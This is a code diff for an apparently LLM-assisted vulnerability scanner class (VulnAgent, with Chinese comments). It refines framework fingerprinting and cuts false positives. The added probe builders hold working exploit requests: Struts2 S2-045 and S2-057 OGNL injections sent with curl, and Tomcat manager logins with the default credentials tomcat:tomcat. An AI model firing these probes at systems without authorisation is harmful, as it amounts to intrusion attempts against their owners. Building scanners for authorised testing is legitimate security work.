@@ -65,7 +65,7 @@ class VulnAgent:
         all_findings: list[VulnFinding] = []
 
         # ── Phase 1: 指纹识别（各端口并发）───────────────
-        fingerprints: dict[str, dict] = {}
+        fingerprints: dict[int, dict] = {}
         fp_tasks = []
         for wp in web_ports:
             scheme = "https" if wp.port in (443, 8443) else "http"
@@ -76,9 +76,9 @@ class VulnAgent:
         for wp, fp_result in zip(web_ports, fp_results):
             if isinstance(fp_result, Exception):
                 logger.warning(f"[VulnAgent] 指纹识别异常 :{wp.port}: {fp_result}")
-                fingerprints[str(wp.port)] = {"url": f"http://{target}:{wp.port}", "summary": "unknown"}
+                fingerprints[wp.port] = {"url": f"http://{target}:{wp.port}", "summary": "unknown"}
             else:
-                fingerprints[str(wp.port)] = fp_result
+                fingerprints[wp.port] = fp_result
                 logger.info(f"[VulnAgent] 指纹 :{wp.port} -> {fp_result.get('summary', 'unknown')}")
 
         # ── Phase 2: LLM 分析指纹 → 扫描策略 ────────────
@@ -140,6 +140,11 @@ class VulnAgent:
             all_findings.extend(llm_findings)
 
         all_findings = _deduplicate(all_findings)
+
+        # ── Phase 5: Finding 事后校验与修正 ───────────────
+        # 根据指纹信息修正误判的 finding（如 Struts2 应用被识别为 Tomcat 弱口令）
+        all_findings = self._enrich_findings(all_findings, fingerprints)
+
         logger.info(f"[VulnAgent] 扫描完成，共 {len(all_findings)} 个发现")
 
         return {"findings": all_findings, "raw_nuclei": "", "raw_nikto": "", "fingerprints": fingerprints}
@@ -186,8 +191,21 @@ class VulnAgent:
         if httpx_result.success and httpx_result.stdout:
             fp["httpx"] = httpx_result.stdout.strip()[:1000]
 
-        # 基础关键词匹配
-        combined = f"{fp['whatweb']} {fp['httpx']} {port_info.version} {port_info.banner}".lower()
+        # ── 获取首页 HTML 内容用于框架识别 ─────────────────
+        # whatweb/httpx 只看 header，很多框架特征在 HTML body 中
+        # 比如 Struts2 Showcase 页面包含 "struts", ".action", "opensymphony"
+        html_body_result: ExecuteResult = await self.executor.run(
+            tool="curl",
+            args=["-s", "-L", "--max-time", "8", web_url],
+            timeout=12,
+        )
+        html_body = ""
+        if html_body_result.success and html_body_result.stdout:
+            html_body = html_body_result.stdout[:5000]
+            fp["html_body_preview"] = html_body[:1000]
+
+        # 基础关键词匹配（增加 HTML body）
+        combined = f"{fp['whatweb']} {fp['httpx']} {port_info.version} {port_info.banner} {html_body}".lower()
         techs = []
         tech_keywords = {
             "thinkphp": "ThinkPHP", "laravel": "Laravel", "django": "Django",
@@ -208,6 +226,80 @@ class VulnAgent:
         for kw, name in tech_keywords.items():
             if kw in combined:
                 techs.append(name)
+
+        # ── HTML body 深度框架检测（补充简单关键词匹配的盲区）──
+        # 有些框架不在 header 里暴露，只能从 HTML body 的特征判断
+        if html_body:
+            html_lower = html_body.lower()
+
+            # Struts2: 页面中出现 .action 链接、opensymphony、xwork
+            import re
+            if not any(t == "Struts" for t in techs):
+                struts_indicators = 0
+                if ".action" in html_lower and ("href" in html_lower or "action=" in html_lower):
+                    struts_indicators += 1
+                if "opensymphony" in html_lower or "xwork" in html_lower:
+                    struts_indicators += 2
+                if "showcase" in html_lower and ".action" in html_lower:
+                    struts_indicators += 2
+                if re.search(r'\.action["\s?;]', html_lower):
+                    struts_indicators += 1
+                if struts_indicators >= 2:
+                    techs.append("Struts")
+                    if "Java" not in techs:
+                        techs.append("Java")
+                    logger.info(f"[VulnAgent] HTML body 检测到 Struts2 (score={struts_indicators})")
+
+            # Shiro: 页面内容中的 rememberMe 相关
+            if not any(t == "Shiro" for t in techs):
+                if "rememberme" in html_lower or "shiro" in html_lower:
+                    techs.append("Shiro")
+
+            # GeoServer: OWS/WFS/WMS 接口
+            if not any(t == "GeoServer" for t in techs):
+                if "geoserver" in html_lower or ("/ows?" in html_lower) or ("/wfs?" in html_lower):
+                    techs.append("GeoServer")
+
+            # ActiveMQ: admin console
+            if not any(t == "ActiveMQ" for t in techs):
+                if "activemq" in html_lower or "amq-" in html_lower:
+                    techs.append("ActiveMQ")
+
+        # ── 技术栈层级区分 ────────────────────────────────
+        # 应用框架（决定漏洞类型的核心技术）
+        APP_FRAMEWORKS = {"Struts", "ThinkPHP", "Flask", "Django", "Spring",
+                          "Laravel", "WordPress", "Drupal", "Joomla",
+                          "GeoServer", "GitLab", "Jenkins", "Nacos",
+                          "Confluence", "Grafana", "XXL-JOB", "Solr"}
+        # 中间件/容器（漏洞归属独立于上层应用）
+        MIDDLEWARE = {"Tomcat", "WebLogic", "JBoss", "ActiveMQ", "RabbitMQ"}
+        # 运行时/服务器（最底层，只有在没有更具体技术时才有意义）
+        SERVERS = {"Nginx", "Apache", "IIS"}
+        # 安全组件（可能叠加在任何框架上）
+        SECURITY_COMPONENTS = {"Shiro", "Fastjson", "Jackson"}
+
+        app_frameworks_found = [t for t in techs if t in APP_FRAMEWORKS]
+        middleware_found = [t for t in techs if t in MIDDLEWARE]
+        security_found = [t for t in techs if t in SECURITY_COMPONENTS]
+        servers_found = [t for t in techs if t in SERVERS]
+
+        # primary_tech: 决定这个端口"是什么应用"
+        # 优先级: 应用框架 > 安全组件 > 中间件 > 服务器
+        if app_frameworks_found:
+            fp["primary_tech"] = app_frameworks_found[0]
+        elif security_found:
+            fp["primary_tech"] = security_found[0]
+        elif middleware_found:
+            fp["primary_tech"] = middleware_found[0]
+        elif servers_found:
+            fp["primary_tech"] = servers_found[0]
+        else:
+            fp["primary_tech"] = ""
+
+        fp["app_frameworks"] = app_frameworks_found
+        fp["middleware"] = middleware_found
+        fp["security_components"] = security_found
+        fp["server_tech"] = servers_found
 
         # ── 主动 JSON 探测（检测 fastjson/jackson/spring 等）──
         # 探测1: 发畸形 @type 看响应状态码
@@ -574,6 +666,48 @@ class VulnAgent:
             logger.info("[VulnAgent] KB 未匹配到任何条目")
             return []
 
+        # ── 技术栈层级过滤 ────────────────────────────────
+        # 当检测到应用框架时，跳过容器/服务器级的"弱口令""配置错误"类 KB 条目
+        # 避免 Struts2 应用被匹配到 "Tomcat弱口令" KB 条目
+        all_app_frameworks = set()
+        for port, fp in fingerprints.items():
+            for tech in fp.get("app_frameworks", []):
+                all_app_frameworks.add(tech.lower())
+
+        if all_app_frameworks:
+            infra_keywords = {"弱口令", "weak password", "default login",
+                              "default credential", "manager deploy"}
+            filtered_entries: dict[str, ExploitEntry] = {}
+            for vid, entry in matched_entries.items():
+                desc_lower = entry.description.lower()
+                category_lower = entry.category.lower() if entry.category else ""
+
+                # 检查是否是容器/服务器级的弱口令/配置类条目
+                is_infra_vuln = False
+                for kw in infra_keywords:
+                    if kw in desc_lower or kw in category_lower:
+                        is_infra_vuln = True
+                        break
+
+                if is_infra_vuln:
+                    # 检查该 KB 条目的技术（如 tomcat）是否只是容器
+                    entry_tech = entry.category.lower() if entry.category else ""
+                    if any(infra in entry_tech for infra in ["tomcat", "nginx", "apache", "iis"]):
+                        # 容器级弱口令条目，但有应用框架存在 → 跳过
+                        logger.info(
+                            f"[VulnAgent] KB 跳过基础设施条目: {vid} "
+                            f"('{entry.description[:40]}')，"
+                            f"因为检测到应用框架: {all_app_frameworks}"
+                        )
+                        continue
+
+                filtered_entries[vid] = entry
+            matched_entries = filtered_entries
+
+        if not matched_entries:
+            logger.info("[VulnAgent] KB 过滤后无匹配条目")
+            return []
+
         logger.info(
             f"[VulnAgent] KB 匹配到 {len(matched_entries)} 个条目: "
             f"{list(matched_entries.keys())}"
@@ -682,24 +816,39 @@ class VulnAgent:
 
             if success_sign and success_sign in combined:
                 confirmed = True
-            elif any(sign in combined for sign in [
-                "uid=", "root:", "www-data", "tomcat:",
-                "fastjson", "com.alibaba.fastjson",
-                "com.sun.rowset", "@type", "autotype",
-                "type not match", "typemismatch",
-                "struts", "ognl", "opensymphony",
-                "ssti", "jinja2",
-                "rememberme=deleteme", "rememberme=delete",
-                "hello 49",      # SSTI: {{7*7}} = 49
-                "command execution",
-                "programmingerror",  # Django SQL error
-                "django.db",
-            ]):
-                confirmed = True
-            elif result.exit_code == 0 and len(stdout) > 10:
-                confirmed = await self._llm_quick_verify(
-                    entry.description, cmd, stdout[:2000], stderr[:500]
-                )
+            else:
+                # 通用确认标志（与具体漏洞类型无关的 RCE/漏洞证据）
+                rce_signs = ["uid=", "root:", "www-data"]
+                # 框架特定确认标志（只在对应探针上下文中有效）
+                probe_specific_signs = {
+                    "builtin_fastjson_detect": ["fastjson", "com.alibaba.fastjson", "autotype", "type not match", "@type"],
+                    "builtin_fastjson_inet": ["fastjson", "com.alibaba.fastjson", "autotype"],
+                    "builtin_s2045_detect": ["x-struts-test", "s2-045-ok"],
+                    "builtin_s2057_detect": ["54289", "location"],
+                    "builtin_s2057_showcase_detect": ["54289", "location"],
+                    "builtin_shiro_detect": ["rememberme=deleteme"],
+                    "builtin_ssti_detect": ["49"],
+                    "builtin_django_detect": ["programmingerror", "django.db", "traceback"],
+                    "builtin_thinkphp_detect": ["thinkphp_rce_ok"],
+                    "builtin_tomcat_put_detect": ["201", "204"],
+                    "builtin_tomcat_weak_detect": ["tomcat_manager_confirmed", "ok - listed applications"],
+                    "builtin_tomcat_weak_html_detect": ["tomcat_manager_html_confirmed"],
+                }
+
+                # 通用 RCE 证据（任何探针都算确认）
+                if any(sign in combined for sign in rce_signs):
+                    confirmed = True
+
+                # 探针特定标志
+                if not confirmed and source in probe_specific_signs:
+                    if any(sign in combined for sign in probe_specific_signs[source]):
+                        confirmed = True
+
+                # 都不匹配 → LLM 快速判断（只在有足够输出时）
+                if not confirmed and result.exit_code == 0 and len(stdout) > 50:
+                    confirmed = await self._llm_quick_verify(
+                        entry.description, cmd, stdout[:2000], stderr[:500]
+                    )
 
             if confirmed:
                 evidence = f"命令: {cmd[:200]}\n输出: {stdout[:3000]}"
@@ -710,26 +859,33 @@ class VulnAgent:
     @staticmethod
     def _replace_target(cmd: str, target_url: str, target_ip: str) -> str:
         """
-        智能替换命令中的 {TARGET} 占位符，避免 http://http://... 双重拼接。
+        智能替换命令中的 {TARGET} 占位符。
 
-        KB 中的命令格式不统一，可能是:
-          - curl http://{TARGET}:8090/     → {TARGET} 应替换为纯 IP
-          - curl {TARGET}/path             → {TARGET} 应替换为完整 URL
-          - /opt/script.sh {TARGET}        → {TARGET} 应替换为完整 URL
+        KB 中的命令格式不统一：
+          - curl http://{TARGET}:8090/    → {TARGET} 替换为纯 IP（命令自带端口）
+          - curl http://{TARGET}/path     → {TARGET} 替换为 IP:port（命令无端口）
+          - curl {TARGET}/path            → {TARGET} 替换为完整 URL
         """
         if "{TARGET}" not in cmd:
             return cmd
 
-        # 检测命令中 {TARGET} 前面是否已有 http:// 或 https://
+        from urllib.parse import urlparse
+        import re
+
+        parsed = urlparse(target_url)
+        hostname = parsed.hostname or target_ip   # 纯 IP，如 "192.168.127.129"
+        host_port = parsed.netloc or target_ip     # IP:port，如 "192.168.127.129:8080"
+
         has_scheme = "http://{TARGET}" in cmd or "https://{TARGET}" in cmd
 
         if has_scheme:
-            # 命令里已经有协议头，{TARGET} 只替换为 IP(:port)
-            # 从 target_url 提取 host:port
-            from urllib.parse import urlparse
-            parsed = urlparse(target_url)
-            host_port = parsed.netloc or target_ip  # "47.109.151.41:8090"
-            cmd = cmd.replace("{TARGET}", host_port)
+            # 检查命令中 {TARGET} 后面是否紧跟 :端口号
+            # 如 http://{TARGET}:8080/path → 命令自带端口，只替换纯 IP
+            if re.search(r'\{TARGET\}:\d+', cmd):
+                cmd = cmd.replace("{TARGET}", hostname)
+            else:
+                # 命令没有自带端口，替换为 IP:port
+                cmd = cmd.replace("{TARGET}", host_port)
         else:
             # 命令里没有协议头，{TARGET} 替换为完整 URL
             cmd = cmd.replace("{TARGET}", target_url)
@@ -769,13 +925,31 @@ class VulnAgent:
             ))
 
         # ── Struts2 检测 ──────────────────────────────
-        if "struts" in keywords or "s2-045" in keywords:
-            probes.append((
-                f'curl -s -I {target_url} '
-                f'''-H "Content-Type: %{{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Struts-Test','S2-045-OK')}}.multipart/form-data" '''
-                f'--max-time 10',
-                "builtin_s2045_detect"
-            ))
+        if "struts" in keywords or "s2-" in keywords or "ognl" in keywords:
+            # S2-045: Content-Type OGNL 注入
+            if "s2-045" in keywords or "s2-046" in keywords or "struts" in keywords:
+                probes.append((
+                    f'curl -s -I {target_url} '
+                    f'''-H "Content-Type: %{{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Struts-Test','S2-045-OK')}}.multipart/form-data" '''
+                    f'--max-time 10',
+                    "builtin_s2045_detect"
+                ))
+
+            # S2-057: namespace OGNL 注入（URL 路径中 ${233*233}）
+            if "s2-057" in keywords or "namespace" in keywords or "11776" in keywords or "struts" in keywords:
+                probes.append((
+                    f'curl -s -D - -o /dev/null '
+                    f'"{target_url}/%24%7B233*233%7D/actionChain1.action" '
+                    f'--max-time 10',
+                    "builtin_s2057_detect"
+                ))
+                # 也试不带 struts2-showcase 前缀的路径
+                probes.append((
+                    f'curl -s -D - -o /dev/null '
+                    f'"{target_url}/struts2-showcase/%24%7B233*233%7D/actionChain1.action" '
+                    f'--max-time 10',
+                    "builtin_s2057_showcase_detect"
+                ))
 
         # ── Shiro 检测 ──────────────────────────────
         if "shiro" in keywords:
@@ -821,9 +995,26 @@ class VulnAgent:
 
         # ── Tomcat 弱口令 检测 ────────────────────────
         if "tomcat" in keywords and ("weak" in keywords or "弱口令" in keywords or "password" in keywords):
+            # 用 text 接口检测 —— 正确的 Manager text 接口返回 "OK - Listed applications"
+            # 不能只看 HTTP 200，因为其他应用可能也返回 200
             probes.append((
-                f'curl -s -u tomcat:tomcat {target_url}/manager/text/list --max-time 10',
+                f'response=$(curl -s -u tomcat:tomcat {target_url}/manager/text/list --max-time 10); '
+                f'if echo "$response" | grep -q "OK - Listed applications"; then '
+                f'echo "TOMCAT_MANAGER_CONFIRMED"; echo "$response"; '
+                f'else echo "NOT_MANAGER: $(echo "$response" | head -1 | cut -c1-100)"; fi',
                 "builtin_tomcat_weak_detect"
+            ))
+            # 也试 html 接口
+            probes.append((
+                f'code=$(curl -s -o /dev/null -w "%{{http_code}}" -u tomcat:tomcat '
+                f'{target_url}/manager/html --max-time 10); '
+                f'if [ "$code" = "200" ]; then '
+                f'body=$(curl -s -u tomcat:tomcat {target_url}/manager/html --max-time 10 | head -5); '
+                f'if echo "$body" | grep -qi "manager\\|application\\|deploy\\|undeploy"; then '
+                f'echo "TOMCAT_MANAGER_HTML_CONFIRMED"; '
+                f'else echo "NOT_MANAGER_HTML: $(echo "$body" | head -1 | cut -c1-80)"; fi; '
+                f'else echo "HTTP_${{code}}"; fi',
+                "builtin_tomcat_weak_html_detect"
             ))
 
         return probes
@@ -1050,6 +1241,117 @@ class VulnAgent:
                         tool="hydra",
                     ))
         return findings
+
+
+    # ================================================================
+    # Phase 5: Finding 事后校验与修正
+    # ================================================================
+
+    @staticmethod
+    def _enrich_findings(
+        findings: list[VulnFinding],
+        fingerprints: dict[int, dict],
+    ) -> list[VulnFinding]:
+        """
+        根据指纹信息校验和修正 findings。
+
+        解决的核心问题：
+        - S2-057 靶场运行在 Tomcat 上 → VulnAgent 误判为 "Tomcat弱口令"
+        - 原因：指纹里有 tomcat，KB 匹配到 tomcat 弱口令条目，verification
+          返回 200（Struts2 页面）→ LLM 错误确认
+        - 修正：当 finding 的漏洞类型是"基础设施漏洞"（如容器弱口令），
+          但指纹的 primary_tech 是应用框架（如 Struts2），则降级该 finding
+
+        同时给每个 finding 的 evidence 补充指纹上下文，让 registry 评分更准。
+        """
+        if not fingerprints:
+            return findings
+
+        # 收集所有端口的技术栈层级信息
+        all_app_frameworks = set()
+        all_middleware = set()
+        all_security = set()
+        primary_techs = set()
+
+        for port, fp in fingerprints.items():
+            for tech in fp.get("app_frameworks", []):
+                all_app_frameworks.add(tech.lower())
+            for tech in fp.get("middleware", []):
+                all_middleware.add(tech.lower())
+            for tech in fp.get("security_components", []):
+                all_security.add(tech.lower())
+            pt = fp.get("primary_tech", "")
+            if pt:
+                primary_techs.add(pt.lower())
+
+        if not all_app_frameworks and not all_security:
+            # 没检测到应用框架，不做修正
+            return findings
+
+        # ── 定义"容器/基础设施级"漏洞关键词 ──
+        # 这些关键词出现在 finding name 里，说明这是一个基础设施漏洞
+        infra_vuln_keywords = {
+            "tomcat": ["弱口令", "weak", "default", "manager", "war部署"],
+            "nginx": ["配置", "misconfig", "traversal", "crlf"],
+            "apache": ["配置", "misconfig"],
+        }
+
+        enriched = []
+        for finding in findings:
+            name_lower = finding.name.lower()
+            port = finding.port
+
+            # 获取该端口的指纹
+            port_fp = fingerprints.get(port, {}) if port else {}
+            port_primary = port_fp.get("primary_tech", "").lower()
+            port_apps = [t.lower() for t in port_fp.get("app_frameworks", [])]
+
+            # ── 规则 1: 基础设施漏洞 + 应用框架存在 → 降级 ──
+            should_downgrade = False
+            for infra_name, vuln_keywords in infra_vuln_keywords.items():
+                if infra_name in name_lower:
+                    # finding 是 tomcat/nginx/apache 的漏洞
+                    if any(kw in name_lower for kw in vuln_keywords):
+                        # 是弱口令/配置类漏洞
+                        if port_apps or (all_app_frameworks - {infra_name}):
+                            # 但该端口（或全局）检测到了应用框架
+                            actual_app = port_primary or (list(primary_techs)[0] if primary_techs else "")
+                            logger.info(
+                                f"[VulnAgent] ⚠ 降级 Finding: '{finding.name}' "
+                                f"→ 端口主要技术是 {actual_app}，"
+                                f"'{infra_name}' 只是容器/服务器"
+                            )
+                            should_downgrade = True
+                            break
+
+            if should_downgrade:
+                # 不是删除，而是降低优先级
+                finding.exploitable = False
+                finding.severity = "info"
+                finding.description = (
+                    f"[降级] {finding.description} "
+                    f"（指纹显示主要技术为 {port_primary or list(primary_techs)[0] if primary_techs else '未知'}，"
+                    f"此漏洞可能是误判）"
+                )
+
+            # ── 规则 2: 给所有 finding 补充指纹上下文 ──
+            # 让 registry 评分时有更多信息
+            fp_context_parts = []
+            if port_primary:
+                fp_context_parts.append(f"primary_tech={port_primary}")
+            if port_apps:
+                fp_context_parts.append(f"app_frameworks={','.join(port_apps)}")
+            for sc in port_fp.get("security_components", []):
+                fp_context_parts.append(f"security={sc.lower()}")
+
+            if fp_context_parts:
+                fp_context = " | ".join(fp_context_parts)
+                if fp_context not in finding.evidence:
+                    finding.evidence = f"[指纹] {fp_context}\n{finding.evidence}"
+
+            enriched.append(finding)
+
+        return enriched
 
 
 def _deduplicate(findings: list[VulnFinding]) -> list[VulnFinding]:
